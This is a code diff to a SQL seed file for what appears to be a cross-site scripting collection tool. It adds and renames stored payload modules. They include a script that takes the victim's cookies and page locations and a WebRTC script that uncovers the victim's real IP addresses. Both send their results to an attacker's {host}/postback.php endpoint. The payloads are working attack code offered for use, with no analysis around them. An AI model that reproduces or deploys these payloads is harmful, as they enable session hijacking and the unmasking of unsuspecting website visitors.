@@ -54,7 +54,8 @@ set @root_uuid=uuid();
 
 INSERT INTO `modules` (`guid`, `module_name`, `payload`) VALUES
 ('2ac3a5c7-6f17-4768-beab-324a82e75458', '弹窗测试', 'alert(&quot;xss&quot;)'),
-('df803ba4-e35b-47cc-b0be-8374f2e75210', '读取COOKIE', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);');
+('df803ba4-e35b-47cc-b0be-8374f2e75210', '读取Cookie', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
+('6BB5A215-5101-5041-9751-E1F6B670F0D9', 'WebRTC查真实IP', 'function findIP(onNewIP) {\n	var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;\n	var pc = new myPeerConnection({iceServers: [{urls: &quot;stun:stun.l.google.com:19302&quot;}]}),\n	noop = function() {},\n	localIPs = {},\n	ipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,\n	key;\n\n	function ipIterate(ip) {\n		if (!localIPs[ip] &amp;&amp; ip != &#039;0.0.0.0&#039;) {\n			onNewIP(ip);\n		}\n		localIPs[ip] = true;\n	}\n	  \n	pc.createDataChannel(&quot;&quot;);\n	 \n	pc.createOffer(function(sdp) {\n		sdp.sdp.split(&#039;\\n&#039;).forEach(function(line) {\n			if (line.indexOf(&#039;candidate&#039;) &lt; 0) return;\n			line.match(ipRegex).forEach(ipIterate);\n		});\n		pc.setLocalDescription(sdp, noop, noop);\n	}, noop);\n	  \n	pc.onicecandidate = function(ice) {\n		if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;\n		ice.candidate.candidate.match(ipRegex).forEach(ipIterate);\n	};\n}\n\nfunction addIP(ip) {\n	var x=new Image();\n	x.src=&#039;{host}/postback.php?id={projectId}&amp;ip=&#039;+escape(ip);\n}\nfindIP(addIP);');
 
 -- --------------------------------------------------------
 
@@ -75,7 +76,7 @@ CREATE TABLE `project` (
 --
 
 INSERT INTO `project` (`guid`, `user_guid`, `project_name`, `timestamp`, `payload`) VALUES
-('5WDCa1', @root_uuid, '回传Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
+('5WDCa1', @root_uuid, '读取Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
 ('Hq5Cu9', @root_uuid, '弹窗测试', '2020-06-19 11:30:10', 'alert(&quot;xss&quot;)');
 
 -- --------------------------------------------------------
